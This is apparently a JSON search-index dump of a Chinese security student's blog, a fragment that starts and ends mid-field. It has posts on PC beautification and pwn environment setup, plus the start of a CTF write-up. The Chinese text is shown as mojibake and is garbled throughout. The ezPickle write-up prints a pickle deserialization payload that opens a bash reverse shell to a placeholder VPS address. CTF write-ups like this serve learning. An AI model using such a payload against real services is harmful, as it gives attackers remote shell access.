Wp"},{"categories":[],"contents":"é™¤äº†ç”µè„‘ï¼Œä»£ç ï¼Œç½‘ç»œä¹‹å¤–çš„ç”Ÿæ´»ï¼Œä¹Ÿæ˜¯è¦è®¤çœŸå¯¹å¾…å™¢\n","date":"2021-10-28T18:36:27+08:00","permalink":"https://amiaaaz.github.io/relax/","section":"","tags":[],"title":"Just Relax here......"},{"categories":[],"contents":"å†™åœ¨å‰é¢ è¿™å°†è‚¯å®šæ˜¯ä¸ªé•¿æœŸæ›´æ–°çš„ç³»åˆ—äº†â€¦â€¦\næˆ‘å¯¹äºâ€œç¾åŒ–xxâ€æ€»æœ‰ä¸€ç§ç—´è¿·çš„çˆ±å¥½ï¼Œå°å­¦çš„æ—¶å€™å°±æŠ˜è…¾è¿‡é›¨æ»´æ¡Œé¢ï¼ˆç°åœ¨ç¿»qqé‚®ç®± è¿˜èƒ½æ‰¾åˆ°14å¹´çš„è¿œå¤é‚®ä»¶ï¼‰è™½ç„¶å¯æƒœçš„æ˜¯å½“æ—¶çš„æˆªå›¾æ²¡æœ‰ä¿ç•™ä¸‹æ¥ï¼Œä½†å°è±¡ä¸­æ˜¯å¾ˆæ¼‚äº®å¾ˆæ¼‚äº®çš„\nä¹Ÿæ˜¯é‚£ä¸ªæ—¶å€™ï¼Œå¼€å§‹ç»™è‡ªå·±çš„æ‰‹æœºåˆ·æœº ä¸ºäº†æ¢æ›´å¥½çœ‹çš„å­—ä½“å’Œæ¨¡å—ï¼ˆé‚£æ˜¯ä¸ªæµ·ä¿¡çš„å®‰å“æœº å¾ˆä¾¿å®œ ä¹Ÿæ˜¯äººç”Ÿä¸­ç¬¬ä¸€éƒ¨æ‰‹æœºï¼‰ï¼Œå®³ å½“ç„¶ç”¨çš„æ˜¯xxä¸€é”®rootå·¥å…·ä¹‹ç±»çš„ï¼Œç»“æœåˆšåˆ·å¥½ä¸€ä¼šå°±å˜ç –äº† = =ï¼ˆå½“ç„¶è¿™ä¸é‡è¦ï¼‰\nåˆä¸­ä¹‹åæ‰‹æœºä¹Ÿæ¢æˆäº†å°ç±³ï¼Œæ›´æ˜¯ä¸‰å¤©ä¸¤å¤´çš„åˆ·ä¸»é¢˜å•†åº— æ„æ€æ€ä¹ˆæ··æ­å‡ºæœ€å¥½çœ‹çš„ä¸ªæ€§ä¸»é¢˜ï¼Œä½†æ˜¯ä¹Ÿå°±æ­¢æ­¥äºæ­¤ é«˜ä¸­ä¹‹åè¯¾ä½™æ—¶é—´å˜å°‘ï¼Œä¹Ÿæ…¢æ…¢æ²¡æœ‰ç©ºå¯¹è‡ªå·±çš„æ‰‹æœºå¥½å¥½çš„ç¾åŒ– ç”µè„‘æ›´æ˜¯ä¸æ€ä¹ˆç”¨äº†ï¼›å…¶é—´å€’æ˜¯å€’è…¾è¿‡ä¸€æ®µæ—¶é—´çš„é’¢ç¬”å½©å¢¨ ç°åœ¨è¿˜æœ‰ä¸å°‘å›¤è´§ï¼Œå›æ°´å‘€ é²¶é±¼å‘€ ç™¾ä¹å‘€ è¿˜æœ‰å¾ˆå¤šå…¶ä»–ç‰Œå­çš„å¢¨ç°åœ¨è¿˜éƒ½åœ¨ä¹¦æ¡Œçš„å°å­ä¸Šï¼Œå„ç§èŠ±é‡Œèƒ¡å“¨åˆæ¯«æ— åµç”¨ååˆ†å¥½çœ‹çš„ç¬”ç°åœ¨ä¹Ÿè¢«ç›¸å½“è§„æ•´çš„æ”¶åœ¨äº†ç”¨ä½œå±•ç¤ºçš„äºšå…‹åŠ›æ¶å­ä¸Šï¼ˆæ˜¯ä¸€ç§å¯ä»¥æ–œç€æ”¾ç¬”çš„æ¶å­ å›¾ç‰‡å¦‚ä¸‹ æˆ‘æœ‰6ä¸ªè¿™æ ·çš„æ”¶çº³ç¬”ç­’ å‹‰å¼ºå¤Ÿæ”¾æˆ‘çš„ç¬”ä»¬ï¼‰åŒ…æ‹¬å¾ˆå¤šå¾ˆè´µçš„é™å®šç¬”TATç°åœ¨å›å¤´å†çœ‹å¥½å¿ƒç–¼é’± å¤ªè´¥å®¶äº†\nå…œå…œè½¬è½¬ï¼Œç›´åˆ°å¤§ä¸€çš„å¯’å‡æ‰å†æŠŠæ‰‹æœºå’Œç”µè„‘æ–¹é¢çš„ç¾åŒ–ç»™æ‹¾èµ·æ¥ï¼Œç„¶è€Œæ´»åŠ›å’ŒåŠ²å¤´ä¸å‡å½“å¹´\nå‰å‡ å¤©æ­åšå®¢çš„æ—¶å€™å°±æƒ³ é™¤äº†wpå’Œä¸€äº›å­¦ä¹ ç¬”è®°ä¹‹å¤–ï¼Œè¿˜æœ‰ä»€ä¹ˆæ˜¯æ—¢å€¼å¾—è‡ªå·±è®°å½• åˆå€¼å¾—åˆ†äº«å‡ºæ¥çš„å‘¢ï¼Ÿ~~ï¼ˆè™½ç„¶å¹¶æ²¡æœ‰äººä¼šçœ‹å°±æ˜¯äº†ï¼‰~~è„‘å­é‡Œç¬¬ä¸€ä¸ªè¹¦å‡ºæ¥çš„å°±æ˜¯\u0026quot;beautify\u0026quot;â€”â€”è¿™æ˜¯æœ€æœ€é€‚åˆä¸è¿‡çš„äº†ï¼ï¼ï¼\næ‰€ä»¥å…ˆç®€å•æ¦‚è¿°ä¸€ä¸‹ç°çŠ¶ ç›®å‰çš„æ‰‹æœºæ˜¯å°ç±³10ï¼Œå¤‡ç”¨æœºæ˜¯å°ç±³5spï¼ˆæ²¡é”™ å°±æ˜¯é‚£ä¸ªéªé¾™825å‘çƒ­ç‹‚é­”â€¦â€¦æ— æ¯”åæ‚”å½“æ—¶å› ä¸ºå°ç±³6æ²¡æœ‰3.5mmè€³æœºå­”è€Œæ¯…ç„¶å†³ç„¶åœ°é€‰æ‹©äº†å®ƒï¼‰ç”µè„‘æ˜¯å°æ–°pro16ç‹¬æ˜¾ç‰ˆï¼Œç»¼åˆæ€§èƒ½éƒ½è¿˜å¯ä»¥\næ‰‹æœºå’Œç”µè„‘ä½œä¸ºå¹³æ—¶çš„ä¸»è¦ç”Ÿäº§åŠ›å·¥å…·ï¼Œç¾åŒ–çš„æ–¹å‘å’Œæ³¨æ„ç‚¹ä¸»è¦æœ‰è¿™ä¹ˆå‡ ä¸ªï¼š\n è‰²å½©æ­é…è¦åˆç†ï¼Œç©ºé—´ç»“æ„è¦æœ‰åº æœ‰è½»å·§çš„å¿«æ·å°å·¥å…·æ¥æé«˜æ•ˆç‡ è‡ªå·±ç”¨ç€å¾—ç§°å¿ƒé¡ºæ‰‹ï¼Œä¸éšæ³¢é€æµå»é€‰æ‹©è¿‡äºç¹æ‚çš„ç¾åŒ–æ–¹å¼ å…¼å…·é¢œå€¼å’Œå®ç”¨æ€§ï¼Œå·¥å…·æœ€ç»ˆæœåŠ¡äºäººï¼Œä¸è¿½æ±‚é¢œå€¼è€Œç‰ºç‰²æ€§èƒ½  æ‰€ä»¥åŸºäºä»¥ä¸Šçš„~~â€œåœ£ç»â€~~â€œç¾åŒ–æ€è·¯â€ï¼Œæœ¬ç¯‡å…ˆä»æˆ‘çš„pcç®€å•è¯´èµ·å§(ã‚âˆ€ï½¥)â˜†\nâ€”â€”â€”â€”é¢„è­¦ï¼šå¯èƒ½ä¼šå¾ˆé•¿å¾ˆé•¿ï¼Œå¤§æ¦‚ç‡ä¹‹åä¼šä¿®ä¿®è¡¥è¡¥å½¢æˆä¸€ä¸ªè¿~ç»­~å‰§~\næ·±è‰²æ¨¡å¼ï¼Ÿäº®è‰²æ¨¡å¼ï¼ ï¼ˆå…ˆç»™è‡ªå·±å å±‚ç”²ï¼‰æ‰‹æœºä¸Šæˆ‘è®¾ç½®æ™šä¸Š11ç‚¹ä»¥åè‡ªåŠ¨æ·±è‰²æ¨¡å¼å¹¶ä¸”éå¸¸å–œæ¬¢è¿™ä¸ªåŠŸèƒ½ï¼Œè®©æˆ‘æ™šä¸Šçœ‹æ‰‹æœºä¸å†çœ¼ç\nä½†æ˜¯ï¼ï¼ï¼ä½†æ˜¯ï¼ï¼ï¼ä½¿ç”¨pcçš„åœºæ™¯éƒ½æ˜¯ç¯å¢ƒç¯å…‰æ­£å¸¸çš„æƒ…å†µï¼Œåœ¨è¿™æ ·çš„æƒ…å†µä¸‹æ·±è‰²åº•é…ä¸Šç™½è‰²/èŠ±é‡Œèƒ¡å“¨è‰²çš„ä»£ç çœŸçš„ä¸ä¼šè®©äººçœ¼æ™•å—ï¼ï¼ï¼æˆ‘æ˜¯å®Œå…¨æ¥å—ä¸æ¥ï¼Œå“’å’©ï¼ï¼ï¼\næ‰€ä»¥æˆ‘çš„å„ç§terminal\u0026amp;ide\u0026amp;å…¶å®ƒç§ç§çš„é…è‰²ï¼Œå…¨ éƒ¨ éƒ½ æ˜¯ äº®è‰²æ¨¡å¼\nkali è¿™ä¸ªé¢œå€¼ä¸ç”¨å¤šè¯´å§ï¼ˆ\nubuntu vscode ä¸»é¢˜ï¼šGithub Light Theme\nidea ä¸€äº›åŸºç¡€è§‚å¿µ é…è‰²å¿…é¡»ç»Ÿä¸€ ä¸€å¼ å›¾å°±æ˜ç™½äº†\nedgeæˆ‘å–œæ¬¢å‚ç›´æ ‡ç­¾é¡µï¼Œä¼šè®©æ˜¾ç¤ºç©ºé—´å˜å¤§ï¼Œå¼€å››äº”åä¸ªæ ‡ç­¾é¡µçš„æ—¶å€™ä¾§æ ä¹Ÿä¸ä¼šæ‹¥æŒ¤ï¼Œä¸»é¢˜æ˜¯å†°å‡‰çš„è–„è·ï¼›Chromiumçš„ä¸»é¢˜æ˜¯Sea Foam\nedgeæ›¾ç»æˆ‘è§‰å¾—ä¸€ä¸ªç—›ç‚¹æ˜¯ä¸èƒ½ç»™æ ‡ç­¾é¡µåˆ†ç»„ï¼Œç›´åˆ°æœ€è¿‘çš„æ›´æ–°ä¸Šäº†è¿™ä¸ªåŠŸèƒ½ï¼Œé‚£è¿™å°±æ²¡å•¥è¯´çš„äº†ï¼Œåœ¨æˆ‘å¿ƒä¸­å·²ç»è¶…è¶Šäº†Chromeï¼Œedgeå¤©ä¸‹ç¬¬ä¸€ï¼\næ¡Œé¢å¿…é¡»ç®€æ´ èƒŒæ™¯å›¾id=89931517ï¼Œéšè—äº†æ¡Œé¢å›¾æ ‡å’Œåº•è¾¹ä»»åŠ¡æ ï¼ˆalt+tab æˆ–è€…ä¸‰æŒ‡çš„è§¦æ‘¸æ‰‹åŠ¿è¦æ¯”ç‚¹å‡»åˆ‡æ¢åº”ç”¨é¡µé¢æ›´æ–¹ä¾¿ï¼ˆå†µä¸”å¹³æ—¶åªæ˜¾ç¤ºæ¡Œé¢çš„æƒ…æ™¯å¾ˆå°‘ï¼Œå¤§éƒ¨åˆ†æƒ…å†µä¸‹éƒ½æ˜¯å¼€ä¸€å †å †çš„é¡µé¢\nwin10çš„ç£è´´æˆ‘çœŸçš„å¤ªçˆ±äº†\né™¤äº†å¶å°”ä¼šå‡ºBug é‡å¯ä¸ªç³»ç»Ÿç»“æœæˆ‘æ’å¥½çš„é¡ºåºå…¨æ•´æ²¡äº†ğŸ˜…å´©è¿‡å¥½å‡ æ¬¡äº†å·²ç»\næœ‰äº›å·¥å…·åœ¨æ–‡ä»¶å¤¹ä¸­ï¼Œå°±æ²¡æœ‰å…¨è´´ä¸Šæ¥äº†ï¼Œå®Œæ•´çš„å½¢æ€åº”è¯¥æ˜¯ä¸€ä¸ªå¿ƒå‹~\næŒ‡é’ˆå¿…é¡»èŠ±å“¨ æœ‰è°èƒ½æ‹’ç»å°è±†æ³¥å‘¢ï¼\nshell\u0026amp;terminal zshell zhellå¤šå¥½ç”¨ä¸ç”¨æˆ‘å¤šè¯´å§ï¼Ÿkalié»˜è®¤çš„å°±æ˜¯zshellï¼Œé«˜äº®ã€ä»£ç è¡¥å…¨ç­‰åŠŸèƒ½æ˜¯çœŸçš„å¤ªè´´å¿ƒäº†ï¼Œbashè·Ÿå®ƒä¸€æ¯”çœŸæ˜¯ç›¸å½¢è§ç»Œï¼Œæ‰€ä»¥æˆ‘çš„linuxè™šæ‹Ÿæœºä»¥åŠvpséƒ½ä¸Šäº†zhell\u0026amp;oh-my-zshï¼›è¯•äº†ä¸€äº›ä¸»é¢˜ï¼Œä½†è¿˜æ˜¯é»˜è®¤çš„robbyrussellæ·±å¾—æˆ‘å¿ƒâ€¦â€¦\nåªæœ‰çš®è‚¤ä¹Ÿä¸è¡Œï¼Œè¿˜å¾—é…ä¸Šç»™åŠ›çš„æ’ä»¶â€”â€”zsh-syntax-highlightingï¼ˆè¯­æ³•é«˜äº®ï¼‰å’Œzsh-autosuggestionsï¼ˆæ ¹æ®å†å²è®°å½•è‡ªåŠ¨è¡¥å…¨ï¼‰\nwindows terminal winè‡ªå¸¦çš„cmdå’Œpowershellï¼Œåªèƒ½è¯´æ‡‚å¾—éƒ½æ‡‚â€”â€”ä¸€ä¸ªæ˜¯å¤§é»‘æ¡†ä¸€ä¸ªæ˜¯å¤§è“æ¡†ï¼Œå‰è€…ç®€é™‹è‡³æï¼Œåè€…çš„æŠ¥é”™é¡µé¢ï¼ˆè“åº•çº¢å­—ï¼‰çœ‹ç€èƒ½è®©äººå¿ƒè·³éª¤åœï¼Œå³ä½¿æˆ‘å·²ç»å°½åŠ›è®¾ç½®èƒŒæ™¯é€æ˜ã€æ˜¾ç¤ºçš„é¢œè‰²ï¼Œå‡ºæ¥çš„æ•ˆæœä¹Ÿä¸å°½äººæ„\nè¿™æ—¶Terminalè¿™ä¸ªç¥å¥‡çš„ä¸œè¥¿å°±æ¥æ•‘åœºäº†â€”â€”é…åˆpwsh7\u0026amp;oh-my-poshå‡ ä¹å¯ä»¥è¾¾åˆ°ç±»zshçš„ä½“éªŒ\næ­¤å¤„çš„shellä¸»é¢˜æ˜¯ysï¼ˆå¯¹æ²¡çœ‹é”™ å°±æ˜¯zshä¸‹å¾ˆç«çš„é‚£ä¸ªï¼‰ï¼ŒèƒŒæ™¯å›¾id=89393158ï¼Œé…è‰²æ–¹æ¡ˆæ˜¯ayu_lightï¼Œå­—ä½“æ˜¯12å·Cascadia Code PLï¼›åŠ è½½äº†posh-gitå’Œoh-my-poshæ¨¡å—ï¼Œå¹¶è®¾ç½®äº†PSReadLine\nè¿™æ ·ä¸€æ¥æˆ‘ä»¬çš„pwshä¹Ÿæœ‰äº†æ ¹æ®å†å²è®°å½•è‡ªåŠ¨è¡¥å…¨ã€tabé€‰æ‹©ç›®å½•è¿™æ ·çš„åŠŸèƒ½ï¼ˆæ›´å¤šçš„åŠŸèƒ½å¯ä»¥å‚ç…§å®˜æ–¹æ–‡æ¡£è‡ªè¡Œè®¾ç½®ï¼‰\nåŒæ—¶**win+`**è¿™ä¸ªå¿«æ·é”®å¯ä»¥å‘¼å‡ºä¸´æ—¶åœé çª—å£â€œç„¦ç‚¹ç»ˆç«¯â€\nå¯¹ä¸´æ—¶æƒ³è¦æ‰§è¡Œä¸ªè„šæœ¬ã€è¿ä»¥ä¸‹vpsã€æŸ¥ä¸ªä¸œè¥¿ä»€ä¹ˆçš„ç®€ç›´ä¸èƒ½æ›´æ–¹ä¾¿ï¼\nåŒæ—¶å®ƒè¿˜æ”¯æŒé€šè¿‡jsonæ¥æ·»åŠ é…ç½®æ–‡ä»¶ï¼Œå¯ä»¥å°†è‡ªå·±çš„vpsç›´æ¥åŠ è¿›æ¥\nå†è®¾ç½®ssh-keyå°±å¯ä»¥ä¸€é”®å…å¯†ç™»å½•å•¦äº†ï¼\nå”¯ä¸€çš„ç¼ºæ†¾ï¼Œå°±æ˜¯ä¸åƒfinal shellä¸€æ ·æœ‰å¾ˆå¥½çš„æ–‡ä»¶ä¸Šä¼ ä¸‹è½½ä»¥åŠftpçš„åŠŸèƒ½ï¼Œä¸ç„¶å¯ä»¥ç›´æ¥é©äº†å…¶å®ƒsshç»ˆç«¯çš„å‘½ï¼ˆè¯´çš„å°±æ˜¯ä½  finalshellï¼‰\nå¿…ä¸å¯å°‘çš„å°å·¥å…· everything æ›¾ç»å¹´å°‘è½»ç‹‚çš„æˆ‘å›ºæ‰§çš„è®¤ä¸ºè¿™ç§ä¸œè¥¿æ˜¯ç»™å‘½åæ–‡ä»¶ä¸è§„èŒƒçš„äººå‡†å¤‡çš„\nåæ¥æˆ‘å‘ç°æˆ‘é”™äº†â€¦â€¦everythingçœŸé¦™ï¼ï¼ï¼ï¼\nå®ƒèƒ½éå¸¸éå¸¸è¿…é€Ÿçš„æ‰¾åˆ°æˆ‘æƒ³è¦çš„æ–‡ä»¶ï¼Œè¿˜èƒ½è¿›è¡Œé¢„è§ˆï¼Œå¤ªå¥½ç”¨äº†ç®€ç›´æ˜¯\nSnipaste æœ€å¼ºæˆªå›¾å·¥å…·äº†ï¼Œæˆªå›¾åå¯ä»¥è´´åœ¨å±å¹•ä¸Šï¼Œè°ƒæ•´å¤§å°ã€é€æ˜åº¦ã€ç®€å•çš„æ¶‚é¸¦æ ‡æ³¨éƒ½ä¸åœ¨è¯ä¸‹ï¼Œå ç”¨å†…å­˜ä¹Ÿæ¯”è¾ƒå°ï¼Œè£…æœºå¿…å¤‡~\nCClose åˆä¸€ä¸ªè£…æœºå¿…å¤‡äº†\nå°±è¯´è¿™äº›åŠŸèƒ½è¿˜æœ‰è°ä¸å¿ƒåŠ¨ï¼ï¼ï¼ï¼ï¼ï¼å†…å­˜å ç”¨ä¹Ÿå¾ˆå°ï¼Œå¯ä»¥è¯´æå¤§çš„æå‡äº†æˆ‘å¹³å¸¸çš„å­¦ä¹ æ•ˆç‡\nï¼ˆå»ºè®®è‡ªå¯åŠ¨+ä»¥ç®¡ç†å‘˜æ¨¡å¼å¼€å¯ï¼ˆé˜²æ­¢æŸäº›è¿‡äº†UACçš„åº”ç”¨å®ƒæ²¡æœ‰æƒé™\nDigital Clock å°±æ˜¯è¿™ä¸ªä¼šä¸€ç›´å‡ºç°åœ¨æˆ‘å„ç§æˆªå›¾ä¸­çš„å°éƒ¨ä»¶å¤Ÿç®€å•ï¼Œè¿™ä¸ªå¤§å°æ”¾åœ¨å±å¹•ä¸Šä¹Ÿååˆ†åˆé€‚ï¼Œè¿˜å¯ä»¥è®¾ç½®é€æ˜åº¦ ä¸ä¼šæŒ¡åˆ°æ–‡å­—\nä½†æ˜¯ä¸çŸ¥é“ä»ä»€ä¹ˆæ—¶å€™å¼€å§‹åœ¨å…³æœºçš„æ—¶å€™ä¼šæŠ¥ä¸ªé”™ï¼Œç„¶åä¸ä¼šä¿å­˜æˆ‘å·²è®¾ç½®å¥½çš„é¢œè‰²æ–¹æ¡ˆï¼Œå¯¼è‡´å†æ¬¡å¼€æœºåéœ€è¦é‡æ–°è®¾ç½®\nå¦å¤–è¿™ç©æ„çš„å†…å­˜å ç”¨ç«Ÿç„¶æœ‰16Mâ€¦â€¦æ„Ÿè§‰è·ŸåŠŸèƒ½å¹¶ä¸æ˜¯ååˆ†åŒ¹é…å•Š å°±åªä¸è¿‡åœ¨å±å¹•ä¸Šå±‚æ˜¾ç¤ºè€Œå·²ï¼ˆä½†æ˜¯å¾ˆå¯æƒœæ²¡æœ‰æ‰¾åˆ°é€‚åˆçš„æ›¿ä»£å“TAT\n*TileBeautify ç£è´´ç¾åŒ–å·¥å…·ï¼Œå¯ä»¥å°†ç£è´´æ¢æˆä»»æ„çš„å›¾ç‰‡ï¼Œè¿›è¡Œç»„åˆä¹‹åä¼šå¾ˆå¥½çœ‹\nï¼ˆä½†æ˜¯å§ æˆ‘æ¢ç”µè„‘ä¹‹åå°±æ²¡æŠ˜è…¾è¿™ä¸ªäº† å› ä¸ºä¸æ–¹ä¾¿\n è¯´å®è¯è¿™ç¯‡æ–‡æ¡£çš„åˆ›å»ºæ—¶é—´æ˜¯\nåˆ«éª‚äº†ï¼Œéƒ½æ˜¯æˆ‘å¤ªæ‡’ç‹—\nä¹‹åä¸€å®šä¼šè®¤çœŸèµ·æ¥çš„ï¼Œä¸ç®¡æ˜¯å­¦ä¹ ä¸Šï¼Œç”Ÿæ´»ä¸Šï¼Œè¿˜æ˜¯ä¸ªäººçš„å‘å±•ä¸Š\næ¯å¤©åšé¢˜ä»€ä¹ˆçš„ï¼Œå‘ç°è‡ªå·±æ˜¯çœŸçš„èœï¼Œæ˜¯çœŸçš„é“æ²¸ç‰©ï¼Œè·Ÿå¤§å®¶æ¯”èµ·æ¥æˆ‘çœŸçš„æ°´å¹³å¤ªä½äº†ï¼Œæ˜¯ä¸å€¼ä¸€æçš„é‚£ç§\nå®³ï¼Œä¸å¤šè¯´äº†\n è·Ÿåˆ«äººå­¦ï¼Œå’Œè‡ªå·±æ¯”\n ","date":"2021-10-28T13:42:14+08:00","permalink":"https://amiaaaz.github.io/2021/10/28/beautify-my-pc/","section":"posts","tags":[],"title":"ç”Ÿäº§åŠ›æ(mei)é«˜(hua)ä¹‹è·¯"},{"categories":["NOTES\u0026SUMMARY"],"contents":"ä»¥ä¸‹ä¸ºUbutun16.04\u0026amp;py2çš„å®‰è£…è¿‡ç¨‹ï¼Œå…¶ä»–ç‰ˆæœ¬å‘½ä»¤å‡ ä¹ç›¸åŒçš„~ï¼ˆUbuntu20\u0026amp;py3çš„æˆ‘ä¹Ÿè£…äº†ä¸€ä¸ªï¼Œæ¯•ç«Ÿpy3æ˜¯ä¸»æµï¼ŒæŠ€æœ¯æ€»æ˜¯å‘å‰å‘å±•çš„å˜›~ï¼‰\nâ€”â€”â€”â€”æ¯•ç«Ÿæˆ‘æ˜¯ä»¥åˆå­¦è€…çš„è§†è§’æ¥å‡†å¤‡pwnçš„ç¯å¢ƒï¼Œè‚¯å®šè¿˜æœ‰å¾ˆå¤šä¸å…¨é¢\u0026amp;æƒ³ä¸åˆ°çš„åœ°æ–¹ï¼Œä¹‹åç”¨åˆ°äº†ä¼šå›æ¥è¡¥ä¸Šçš„~\nå®‰è£…pip2\u0026amp;pip3\u0026amp;ipython\ncurl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py sudo python get-pip.py # sudo apt-get install python3-pip curl https://bootstrap.pypa.io/pip/3.5/get-pip.py -o get-pip.py sudo python3 get-pip.py sudo apt-get install ipython å®‰è£…py2çš„pwntools\npip2 install pathlib2 # py3æ— éœ€æ­¤æ¡ pip2 install pwntools å®‰è£…GDB\u0026amp;æ’ä»¶\nsudo apt-get install git git clone https://github.com/pwndbg/pwndbg.git ./setup.sh # ä½¿ç”¨peda-heap git clone https://github.com/Mipu94/peda-heap.git echo \u0026quot;source ~/peda-heap/peda.py\u0026quot; \u0026gt; ~/.gdbinit # ä½¿ç”¨peda git clone https://github.com/longld/peda.git echo \u0026quot;source ~/GDB-Plugins/peda/peda.py\u0026quot; \u0026gt; ~/.gdbinit # ä½¿ç”¨gef git clone https://github.com/hugsy/gef.git echo \u0026quot;source ~/gef/gef.py\u0026quot; \u0026gt; ~/.gdbinit # ä½¿ç”¨pwndbg echo \u0026quot;source ~/pwndbg/gdbinit.py\u0026quot; \u0026gt; ~/.gdbinit # è‡ªåŠ¨åˆ‡æ¢è„šæœ¬ https://blog.csdn.net/aptx4869_li/article/details/81566541 å®‰è£…one_gadget\nsudo apt-add-repository ppa:brightbox/ruby-ng sudo apt-get update sudo apt-get install ruby2.7 ruby2.7-dev sudo apt-get install gem sudo gem install one_gadget å®‰è£…32ä½åº“\nsudo apt-get install lib32ncurses5 sudo apt-get install lib32z1 å®‰è£…checksec\nsudo apt instal checksec å®‰è£…seccomp-tools\nsudo gem install seccomp-tools å®‰è£…zshell\u0026amp;æ’ä»¶\nsudo apt-get install zsh sh -c \u0026quot;$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\u0026quot; # zsh-syntax-highlighting git clone https://github.com/zsh-users/zsh-syntax-highlighting.git echo \u0026quot;source ${(q-)PWD}/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh\u0026quot; \u0026gt;\u0026gt; ${ZDOTDIR:-$HOME}/.zshrc source ./zsh-syntax-highlighting/zsh-syntax-highlighting.zsh # zsh-autosuggestions git clone https://github.com/zsh-users/zsh-autosuggestions ~/.zsh/zsh-autosuggestions source ~/.zsh/zsh-autosuggestions/zsh-autosuggestions.zsh # å¦‚é‡æŠ¥é”™ error: RPC failed; result=35, HTTP code=0; fatal: The remote end hung up unexpectedly # å°†git clone https://xxxx/xxxx.git æ¢ä¸ºgit clone git://xxxx/xxxx.git å®‰è£…virtualboxå¢å¼ºåŠŸèƒ½\n# é‡æŠ¥é”™ unable to access â€œVBox_GAS_6.0.0 iso9660â€ sudo apt-get install --reinstall linux-image-$(uname -r) æœ€åç»“æœ\nubuntu20+py3+zshï¼ˆåº”è¯¥èƒ½çœ‹å‡ºæ¥æˆ‘æ›´å–œæ¬¢è¿™ä¸ªx\nubuntu16+py2\n ç¬¬ä¸€æ¬¡è£…çš„æ—¶å€™ç›´æ¥å¡åœ¨äº†pwntoolsä¸Šï¼Œåæ¥å‘ç°åŸå› æ˜¯pip2ç‰ˆæœ¬è¿‡ä½ä¸”æ— æ³•ç›´æ¥é€šè¿‡pip -m pip install --upgrade pipè¿›è¡Œå‡çº§ï¼Œåªèƒ½æ‰‹åŠ¨ä¸‹è½½get-pip.pyåé€šè¿‡py2è¿è¡Œæ¥å®‰è£…\nè¿™æ¬¡é…å®Œä¹‹åæœ€å¤§çš„æ„Ÿè§¦å°±æ˜¯è¯¥æ¢ä¸ªå¤§ä¸€ç‚¹çš„ç¡¬ç›˜äº†ï¼Œ512Gå±å®ç»·ä¸ä½æˆ‘æè¿™ä¹ˆå¤šè™šæ‹Ÿæœºâ€¦â€¦\nä¹‹åå¯èƒ½ä¼šæŠ½ç©ºå­¦ä¸€ä¸‹pwnï¼Œå±äºæ˜¯webç‹—å·ä¸åŠ¨äº†è¦ç»™è‡ªå·±æ‰¾ä¸ªåè·¯ï¼ˆè™½ç„¶ç™¾åˆ†ä¹‹ä¹åä¹çš„æ¦‚ç‡æ˜¯ä¸¤ä¸ªéƒ½å¾ˆèœï¼Œxsï¼‰ï¼Œå·èµ·æ¥å·èµ·æ¥ï¼ï¼ï¼\n","date":"2021-10-28T00:41:15+08:00","permalink":"https://amiaaaz.github.io/2021/10/28/pwn-env-init/","section":"posts","tags":["pwn"],"title":"pwnç¯å¢ƒé…ç½®"},{"categories":["CTF"],"contents":" webæœ‰3ä¸ªéƒ½æ˜¯æœ‰äº†åŒ…æµ†çš„åŸé¢˜â€¦â€¦è¿˜æœ‰ä¸€ç‚¹è„‘æ´é¢˜ï¼Œåæ­£å¥‡å¥‡æ€ªæ€ªçš„\nå±äºæ˜¯è¢«å¸ˆå‚…ä»¬å¸¦é£äº†ï¼Œæ‰€ä»¥è¯¦ç»†çš„wpè¿˜æ˜¯è‡ªå·±å†™ä¸€å†™ï¼Œè®¤çœŸåœ°å¤ç°ä¸€ä¸‹\n zerocalc emmmmmm è¯´å®è¯ä¸€å¼€å§‹æ²¡æœ‰å‡º å› ä¸ºæ²¡æ‚Ÿå‡ºæ¥å®ƒè¿™æ˜¯ä¸ªä»€ä¹ˆé€»è¾‘2333333\nezPickle # ç”¨pker.pyç”Ÿæˆpayload notadmin=GLOBAL('config','notadmin') notadmin[\u0026quot;admin\u0026quot;]=\u0026quot;yes\u0026quot; exec=GLOBAL('config','backdoor') payload='''__import__('subprocess').call(\\\u0026quot;echo -e '#!/bin/bash\\\\nsh -i \u0026gt;\u0026amp; /dev/tcp/you_vps_ip/port 0\u0026gt;\u0026amp;1'\u0026gt;x \u0026amp;\u0026amp; bash x \u0026amp;\u0026amp; rm -rf x\\\u0026quot;,shell=True)''' exec(payload) return \u0026gt;\u0026gt;\u0026gt; data=b\u0026#39;cconfig\\nnotadmin\\np0\\n0g0\\nS\\\u0026#39;admin\\\u0026#39;\\nS\\\u0026#39;yes\\\u0026#39;\\nscconfig\\nbackdoor\\np2\\n0S\\\u0026#39;__import__(\\\\\\\u0026#39;subprocess\\\\\\\u0026#39;).call(\u0026#34;echo -e \\\\\\\u0026#39;#!/bin/bash\\\\\\\\nsh -i \u0026gt;\u0026amp; /dev/tcp/you_vps_ip/port 0\u0026gt;\u0026amp;1\\\\\\\u0026#39;\u0026gt;x \u0026amp;\u0026amp; bash x \u0026amp;\u0026amp; rm -rf x\u0026#34;,shell=True)\\\u0026#39;\\np3\\n0g2\\n(g3\\ntR.\u0026#39; \u0026gt;\u0026gt;\u0026gt; print(base64.b64encode(data)) b\u0026#39;xxxxxxxxxx\u0026#39; æ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼ŒåŸºç¡€çš„pickleé¢˜ï¼Œæ˜¯2021å·…å³°æå®¢what_pickleçš„é˜‰å‰²ç‰ˆï¼ˆæ„é€ çš„æ€è·¯å‡ ä¹ä¸€æ · ä½†æ˜¯ç®€å•å¾ˆå¤šï¼‰ï¼Œå‡ ä¹ä¸€æ ·çš„é¢˜ç›®è¿˜æœ‰ [SUCTF 2019]Guess Game\né™åˆ¶çš„ç‚¹åœ¨äºåªå…è®¸å¼•å…¥é¢˜ç›®è‡ªè®¾æ¨¡å—\u0026amp;é™åˆ¶æ¨¡å—ä¸­å«ä¸‹åˆ’çº¿ï¼Œé‚£å°±ç›´æ¥å˜é‡è¦†ç›–ï¼Œç„¶ååˆ©ç”¨ç»™å‡ºçš„eval()å¼¹shellå°±å¥½äº†\nâ€”â€”â€”â€”å¦å¤–è¿™é‡Œçš„payloadä¹Ÿå¯ä»¥æ˜¯ç®€çŸ­ç‰ˆæœ¬çš„å¼¹sehllçš„payload ä¸å”¯ä¸€å˜›\ndata = 